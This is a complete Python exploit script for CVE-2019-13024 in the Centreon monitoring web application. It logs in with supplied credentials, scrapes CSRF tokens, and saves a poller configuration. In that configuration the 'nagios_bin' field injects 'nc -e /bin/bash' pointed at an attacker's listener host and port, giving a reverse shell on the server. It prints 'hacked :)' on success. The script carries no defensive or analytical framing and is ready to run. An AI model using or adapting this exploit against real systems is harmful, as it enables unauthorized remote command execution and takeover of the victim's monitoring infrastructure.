import argparse
import requests
import sys
import lxml.html
import lxml.etree
from log_colors import *
requests.packages.urllib3.disable_warnings()

class CVE2019_13024:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    
    def __init__(self, url, user, pswd, lhost, lport):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.user, self.pswd = user, pswd
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()
    
    # get csrf token for login
    def get_csrf_token(self):
        print (LogColors.BLUE + "get csrf token..." + LogColors.ENDC)
        r = self.session.get(self.url.rstrip() + "/index.php")
        tree = lxml.html.fromstring(r.text)
        csrf_token = tree.xpath('.//input[@name="centreon_token"]/@value')
        csrf_token = csrf_token[0]
        print (LogColors.YELLOW + "token: " + csrf_token + LogColors.ENDC)
        self.csrf_token = csrf_token

    # login
    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        self.get_csrf_token()
        data = {
            "useralias" : self.user,
            "password" : self.pswd,
            "centreon_token" : self.csrf_token,
            "submitLogin" : "Connect",
        }
        r = self.session.post(self.url.rstrip() + "/index.php", data = data)
        if r.ok and "credentials are incorrect" not in r.text:
            print (LogColors.GREEN + "successfully login :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to login :(" + LogColors.ENDC)
            sys.exit()
    
    # get poller token from poller configuration page
    def get_poller_token(self):
        r = self.session.get(self.url.rstrip() + "/main.get.php?p=60901")
        page = r.text.lstrip('<?xml version="1.0" encoding="utf-8"?>').strip()
        tree = lxml.html.fromstring(page)
        csrf_token = tree.xpath('.//input[@name="centreon_token"]/@value')
        csrf_token = csrf_token[-1]
        print (LogColors.YELLOW + "token: " + csrf_token + LogColors.ENDC)
        self.csrf_token = csrf_token

    # exploitation
    def exploit(self):
        self.login()
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        self.get_poller_token()
        payload = {
            "name": "Central",
            "ns_ip_address": "127.0.0.1",
            "localhost[localhost]": "1",
            "is_default[is_default]": "0",
            "remote_id": "",
            "ssh_port": "22",
            "init_script": "centengine",
            "nagios_bin": "nc -e /bin/bash {0} {1} #".format(self.lhost, self.lport),
            "nagiostats_bin": "/usr/sbin/centenginestats",
            "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
            "centreonbroker_cfg_path": "/etc/centreon-broker",
            "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
            "centreonbroker_logs_path": "",
            "centreonconnector_path": "/usr/lib64/centreon-connector",
            "init_script_centreontrapd": "centreontrapd",
            "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
            "ns_activate[ns_activate]": "1",
            "submitC": "Save",
            "id": "1",
            "o": "c",
            "centreon_token": self.csrf_token,
        }
        r = self.session.post(self.url.rstrip() + "/main.get.php?p=60901", data = payload)
        print (LogColors.YELLOW + "send payload..." + LogColors.ENDC)
        if r.ok:
            print (LogColors.GREEN + "successful send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed send payload. exit :(" + LogColors.ENDC)
            sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "url")
    parser.add_argument('-user','--username', required = True, help = "auth username")
    parser.add_argument('-pswd','--password', required = True, help = "auth password")
    parser.add_argument('-lh','--lhost', required = True, help = "revshell listener host")
    parser.add_argument('-lp','--lport', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    user, pswd = args['username'], args['password']
    lhost, lport = args['lhost'], args['lport']
    cve = CVE2019_13024(url, user, pswd, lhost, lport)
    #cve.login()
    cve.exploit()

